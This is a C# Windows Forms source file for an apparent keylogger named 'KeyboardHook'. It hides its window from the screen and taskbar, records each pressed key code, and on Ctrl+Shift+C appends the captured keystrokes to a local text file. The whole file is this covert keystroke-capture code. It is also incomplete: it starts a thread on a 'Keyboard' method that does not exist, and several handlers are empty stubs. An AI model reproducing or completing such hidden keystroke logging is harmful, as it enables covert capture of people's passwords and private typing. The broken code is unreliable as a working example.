using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;
using System.Threading;
using System.IO;

namespace KeyboardHook
{
    public partial class Form1 : Form
    {

        private string hook = "";
        private int counter = 0; //state of keyboardhook 0 = paused 1 =running

        public Form1()
        {
            InitializeComponent();


            //not show in taskbar
            this.ShowInTaskbar = false;

            this.Visible = false;

            this.Hide();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

        }

        private void Form1_KeyPress(object sender, KeyPressEventArgs e)
        {


         //   MessageBox.Show(e.KeyChar.ToString());
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Thread t = new Thread(Keyboard);
            t.Start();
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
                //Keyboard hook Zonica
                hook += e.KeyCode.ToString(); //capture keycode that was pressed

            if (e.Control && e.Shift && e.KeyCode.ToString() == "C")
            {
               
                  //  MessageBox.Show(hook);
                    counter--;
                    String path = @".\abc.txt";

                    using (StreamWriter sr = File.AppendText(path))
                    {
                        sr.WriteLine(hook + "\r\n");
                        sr.Close();
                    }

       
                Application.Exit();
            }
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

        }

        private void timer1_Tick_1(object sender, EventArgs e)
        {
      
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
        }
    }
}

